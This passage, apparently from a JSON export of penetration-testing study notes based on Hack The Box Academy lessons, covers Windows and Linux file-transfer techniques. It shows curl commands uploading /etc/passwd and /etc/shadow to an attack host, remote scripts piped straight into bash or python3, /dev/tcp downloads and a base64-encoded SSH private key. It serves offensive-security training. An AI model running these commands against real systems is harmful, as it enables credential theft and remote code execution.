1820\nConnection: Keep-Alive\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo\n...SNIP...\n```\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts\n```\n\n---\n\n## SMB Uploads\n\nWe previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).\n\nAn alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.\n\nWhen you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.\n\n![Wireshark capture showing TCP, SMB, and HTTP traffic between IP addresses 192.168.49.129 and 192.168.49.128.](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)\n\n#### Configuring WebDav Server\n\nTo set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.\n\n#### Installing WebDav Python modules\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo pip3 install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |████████████████████████████████| 171 kB 1.4 MB/s\n     ...SNIP...\n```\n\n#### Using the WebDav Python module\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n```\n\n#### Connecting to the Webdav Share\n\nNow we can attempt to connect to the share using the `DavWWWRoot` directory.\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    <DIR>          .\n05/18/2022  10:05 AM    <DIR>          ..\n05/18/2022  10:05 AM    <DIR>          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n```\n\n**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.\n\nYou can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \\192.168.49.128\\sharefolder\n\n#### Uploading Files using SMB\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\htb> copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n```\n\n**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.\n\n---\n\n## FTP Uploads\n\nUploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.\n\nWindows File Transfer Methods\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write\n\n/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.\n  warnings.warn(\"write permissions assigned to anonymous user.\",\n[I 2022-05-18 10:33:31] concurrency model: async\n[I 2022-05-18 10:33:31] masquerade (NAT) address: None\n[I 2022-05-18 10:33:31] passive ports: None\n[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<\n```\n\nNow let's use the PowerShell upload function to upload a file to our FTP Server.\n\n#### PowerShell Upload File\n\nWindows File Transfer Methods\n\n```powershell-session\nPS C:\\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n```\n\n#### Create a Command File for the FTP Client to Upload a File\n\nWindows File Transfer Methods\n\n```cmd-session\nC:\\htb> echo open 192.168.49.128 > ftpcommand.txt\nC:\\htb> echo USER anonymous >> ftpcommand.txt\nC:\\htb> echo binary >> ftpcommand.txt\nC:\\htb> echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\nC:\\htb> echo bye >> ftpcommand.txt\nC:\\htb> ftp -v -n -s:ftpcommand.txt\nftp> open 192.168.49.128\n\nLog in with USER and PASS first.\n\n\nftp> USER anonymous\nftp> PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp> bye\n```\n\n---\n\n## Recap\n\nWe discussed several methods for downloading and uploading files using Windows native tools, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/04-Linux File Transfer Methods",
    "path": "02_CPTS/06-File Transfers/04-Linux File Transfer Methods.md",
    "title": "04 Linux File Transfer Methods",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders impro...",
    "category": "02_CPTS",
    "content": "Linux is a versatile operating system, which commonly has many different tools we can use to perform file transfers. Understanding file transfer methods in Linux can help attackers and defenders improve their skills to attack networks and prevent sophisticated attacks.\n\nA few years ago, we were contacted to perform incident response on some web servers. We found multiple threat actors in six out of the nine web servers we investigated. The threat actor found a SQL Injection vulnerability. They used a Bash script that, when executed, attempted to download another piece of malware that connected to the threat actor's command and control server.\n\nThe Bash script they used tried three download methods to get the other piece of malware that connected to the command and control server. Its first attempt was to use `cURL`. If that failed, it attempted to use `wget`, and if that failed, it used `Python`. All three methods use `HTTP` to communicate.\n\nAlthough Linux can communicate via FTP, SMB like Windows, most malware on all different operating systems uses `HTTP` and `HTTPS` for communication.\n\nThis section will review multiple ways to transfer files on Linux, including HTTP, Bash, SSH, etc.\n\n---\n\n## Download Operations\n\nWe have access to the machine `NIX04`, and we need to download a file from our `Pwnbox` machine. Let's see how we can accomplish this using multiple file download methods.\n\n![Network diagram showing two Linux PCs, a Layer 2 switch, a firewall, and a cloud connection.](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)\n\n## Base64 Encoding / Decoding\n\nDepending on the file size we want to transfer, we can use a method that does not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its content into the terminal and perform the reverse operation. Let's see how we can do this with Bash.\n\n#### Pwnbox - Check File MD5 hash\n\n```shell-session\ndrxh3kr@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\nWe use `cat` to print the file content, and base64 encode the output using a pipe `|`. We used the option `-w 0` to create only one line and ended up with the command with a semi-colon (;) and `echo` keyword to start a new line and make it easier to copy.\n\n#### Pwnbox - Encode SSH Key to Base64\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nWe copy this content, paste it onto our Linux target machine, and use `base64` with the option `-d' to decode it.\n\n#### Linux - Decode the File\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa\n```\n\nFinally, we can confirm if the file was transferred successfully using the `md5sum` command.\n\n#### Linux - Confirm the MD5 Hashes Match\n\n```shell-session\ndrxh3kr@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n**Note:** You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.\n\n## Web Downloads with Wget and cURL\n\nTwo of the most common utilities in Linux distributions to interact with web applications are `wget` and `curl`. These tools are installed on many Linux distributions.\n\nTo download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.\n\n#### Download a File Using wget\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\n```\n\n`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.\n\n#### Download a File Using cURL\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\n```\n\n---\n\n## Fileless Attacks Using Linux\n\nBecause of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.\n\n**Note:** Some payloads such as `mkfifo` write files to disk. Keep in mind that while the execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS.\n\nLet's take the `cURL` command we used, and instead of downloading LinEnum.sh, let's execute it directly using a pipe.\n\n#### Fileless Download with cURL\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash\n```\n\nSimilarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.\n\n#### Fileless Download with wget\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3\n\nHello World!\n```\n\n---\n\n## Download with Bash (/dev/tcp)\n\nThere may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.\n\n#### Connect to the Target Webserver\n\n```shell-session\ndrxh3kr@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80\n```\n\n#### HTTP GET Request\n\n```shell-session\ndrxh3kr@htb[/htb]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\n```\n\n#### Print the Response\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat <&3\n```\n\n---\n\n## SSH Downloads\n\nSSH (or Secure Shell) is a protocol that allows secure access to remote computers. SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.\n\n`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely. We can copy our files from local to remote servers and from remote servers to our local machine.\n\n`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.\n\nBefore we begin downloading files from our target Linux machine to our Pwnbox, let's set up an SSH server in our Pwnbox.\n\n#### Enabling the SSH Server\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo systemctl enable ssh\n\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install enable ssh\nUse of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45\n...SNIP...\n```\n\n#### Starting the SSH Server\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo systemctl start ssh\n```\n\n#### Checking for SSH Listening Port\n\n```shell-session\ndrxh3kr@htb[/htb]$ netstat -lnpt\n\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - \n```\n\nNow we can begin transferring files. We need to specify the IP address of our Pwnbox and the username and password.\n\n#### Linux - Downloading Files Using SCP\n\n```shell-session\ndrxh3kr@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . \n```\n\n**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.\n\n---\n\n## Upload Operations\n\nThere are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attack host. The methods we used for downloads will also work for uploads. Let's see how we can upload files in various ways.\n\n---\n\n## Web Upload\n\nAs mentioned in the `Windows File Transfer Methods` section, we can use [uploadserver](https://github.com/Densaugeo/uploadserver), an extended module of the Python `HTTP.Server` module, which includes a file upload page. For this Linux example, let's see how we can configure the `uploadserver` module to use `HTTPS` for secure communication.\n\nThe first thing we need to do is to install the `uploadserver` module.\n\n#### Pwnbox - Start Web Server\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m pip install --user uploadserver\n\nCollecting uploadserver\n  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)\nInstalling collected packages: uploadserver\nSuccessfully installed uploadserver-2.0.1\n```\n\nNow we need to create a certificate. In this example, we are using a self-signed certificate.\n\n#### Pwnbox - Create a Self-Signed Certificate\n\n```shell-session\ndrxh3kr@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\n\nGenerating a RSA private key\n................................................................................+++++\n.......+++++\nwriting new private key to 'server.pem'\n-----\n```\n\nThe webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.\n\n#### Pwnbox - Start Web Server\n\n```shell-session\ndrxh3kr@htb[/htb]$ mkdir https && cd https\n```\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n\nFile upload available at /upload\nServing HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...\n```\n\nNow from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.\n\n#### Linux - Upload Multiple Files\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure\n```\n\nWe used the option `--insecure` because we used a self-signed certificate that we trust.\n\n---\n\n## Alternative Web File Transfer Method\n\nSince Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward. Also, if the server we compromised is a web server, we can move the files we want to transfer to the web server directory and access them from the web page, which means that we are downloading the file from our Pwnbox.\n\nIt is possible to stand up a web server using various languages. A compromised Linux machine may not have a web server installed. In such cases, we can use a mini web server. What they perhaps lack in security, they make up for flexibility, as the webroot location and listening ports can quickly be changed.\n\n#### Linux - Creating a Web Server with Python3\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -m http.server\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n#### Linux - Creating a Web Server with Python2.7\n\n```shell-session\ndrxh3kr@htb[/htb]$ python2.7 -m SimpleHTTPServer\n\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\n#### Linux - Creating a Web Server with PHP\n\n```shell-session\ndrxh3kr@htb[/htb]$ php -S 0.0.0.0:8000\n\n[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started\n```\n\n#### Linux - Creating a Web Server with Ruby\n\n```shell-session\ndrxh3kr@htb[/htb]$ ruby -run -ehttpd . -p8000\n\n[2022-05-23 09:35:46] INFO  WEBrick 1.6.1\n[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]\n[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000\n```\n\n#### Download the File from the Target Machine onto the Pwnbox\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt\n\n--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt\nConnecting to 192.168.49.128:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 0 [text/plain]\nSaving to: 'filetotransfer.txt'\n\nfiletotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      \n\n2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]\n```\n\n**Note:** When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.\n\n---\n\n## SCP Upload\n\nWe may find some companies that allow the `SSH protocol` (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the `scp` utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.\n\n#### File Upload using SCP\n\n```shell-session\ndrxh3kr@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/\n\nhtb-student@10.129.86.90's password: \npasswd                                                                                                           100% 3414     6.7MB/s   00:00\n```\n\n**Note:** Remember that scp syntax is similar to cp or copy.\n\n---\n\n## Onwards\n\nThese are the most common file transfer methods using built-in tools on Linux systems, but there's more. In the following sections, we'll discuss other mechanisms and tools we can use to perform file transfer operations.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/05-Transferring Files with Code",
    "path": "02_CPTS/06-File Transfers/05-Transferring Files with Code.md",
    "title": "05 Transferring Files With Code",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions...",
    "category": "02_CPTS",
    "content": "It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.\n\nWe can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.\n\nAccording to Wikipedia, there are around [700 programming languages](https://en.wikipedia.org/wiki/List_of_programming_languages), and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.\n\n---\n\n## Python\n\nPython is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. `Python` can run one-liners from an operating system command line using the option `-c`. Let's see some examples:\n\n#### Python 2 - Download\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n```\n\n#### Python 3 - Download\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")'\n```\n\n---\n\n## PHP\n\n`PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.\n\nLet's see some examples of downloading files using PHP.\n\nIn the following example, we will use the PHP [file_get_contents() module](https://www.php.net/manual/en/function.file-get-contents.php) to download content from a website combined with the [file_put_contents() module](https://www.php.net/manual/en/function.file-put-contents.php) to save the file into a directory. `PHP` can be used to run one-liners from an operating system command line using the option `-r`.\n\n#### PHP Download with File_get_contents()\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'\n```\n\nAn alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.\n\n#### PHP Download with Fopen()\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = \nfopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'\n```\n\n---\n\nWe can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.\n\n#### PHP Download a File and Pipe it to Bash\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num => $line) { echo $line; }' | bash\n```\n\n**Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.\n\n---\n\n## Other Languages\n\n`Ruby` and `Perl` are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option `-e`.\n\n---\n\n#### Ruby - Download a File\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ ruby -e 'require \"net/http\"; File.write(\"LinEnum.sh\", Net::HTTP.get(URI.parse(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\")))'\n```\n\n---\n\n#### Perl - Download a File\n\nTransferring Files with Code\n\n```shell-session\ndrxh3kr@htb[/htb]$ perl -e 'use LWP::Simple; getstore(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\");'\n```\n\n---\n\n## JavaScript\n\nJavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.\n\nThe following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:\n\nCode: javascript\n\n```javascript\nvar WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");\nWinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);\nWinHttpReq.Send();\nBinStream = new ActiveXObject(\"ADODB.Stream\");\nBinStream.Type = 1;\nBinStream.Open();\nBinStream.Write(WinHttpReq.ResponseBody);\nBinStream.SaveToFile(WScript.Arguments(1));\n```\n\nWe can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.\n\n#### Download a File Using JavaScript and cscript.exe\n\nTransferring Files with 